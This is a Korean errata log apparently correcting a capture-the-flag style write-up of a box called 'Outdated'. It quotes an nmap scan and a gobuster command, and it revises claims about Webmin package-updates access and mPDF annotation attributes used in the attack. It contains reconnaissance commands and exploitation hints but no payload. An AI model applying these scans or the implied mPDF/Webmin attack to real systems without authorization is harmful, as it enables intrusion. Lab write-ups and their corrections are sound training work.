원본 산출물에 없는 `# nmap -sCV -p- -Pn -A --min-rate 5000 192.168.248.232` 주석 줄이 붙어 있고 `ssh-hostkey`·OS 판정·TRACEROUTE 가 잘려 있었음. `nmap.log`·`quick.log` 원문 전량으로 교체함.

> ```text
> # nmap -sCV -p- -Pn -A --min-rate 5000 192.168.248.232
> Nmap scan report for 192.168.248.232
> Host is up (0.090s latency).
> Not shown: 65532 closed tcp ports (reset)
> PORT      STATE    SERVICE          VERSION
> 22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
> 80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
> |_http-server-header: Apache/2.4.41 (Ubuntu)
> |_http-title: Convert HTML to PDF Online
> 10000/tcp filtered snet-sensor-mgmt
> ```

## D4 — gobuster 실행 명령행 (Outdated.md 1장)

`gobuster.log` 에는 결과만 있고 명령행이 없음. `~/.zsh_history` 에도 이 박스 명령이 **0건**(전부 비대화형 `ssh kali "…"` 로 실행). 워드리스트 이름을 단정할 근거가 없어 명령행을 제거하고 원문(ANSI 이스케이프 포함)만 남김.

> ```text
> $ gobuster dir -u http://192.168.248.232/ -w directory-list-2.3-medium.txt -x php,txt,html,bak,zip
> ```

## D5 — 「data-package-updates="1" 도 같은 이야기를 한다」 (Outdated.md 4장) — **반증되어 정정**

`exploit_resp.html`(Referer 거부 응답)의 루트 태그에도 `data-package-updates="1"` 이 **똑같이** 있음. 노트는 `data-access-level="0"` 만 함정으로 적고 `data-package-updates="1"` 은 근거로 인정했는데, 둘 다 근거가 못 됨.

> **200 으로 모듈 본문이 돌아온 것 자체**가 svc-account 에게 package-updates 접근권이 있다는 증거다 — ACL 이 없으면 Webmin 은 모듈 대신 거부 페이지를 준다. 응답 루트 태그의 `data-package-updates="1"` 도 같은 이야기를 한다. 같은 태그에 있는 `data-access-level="0"` 을 근거로 삼으면 안 된다.

## D6 — `<annotation>` 속성 필요성 단정 (Outdated.md 2장) — **`[가정]`/「관측 없음」으로 강등**

각 속성을 뺀 실험을 한 적이 없음.

> - `content` / `icon` / `title` / `pos-x` — mPDF 가 annotation 을 그리려면 필요한 속성. 빠지면 태그가 무시되거나 첨부가 생성되지 않는다.
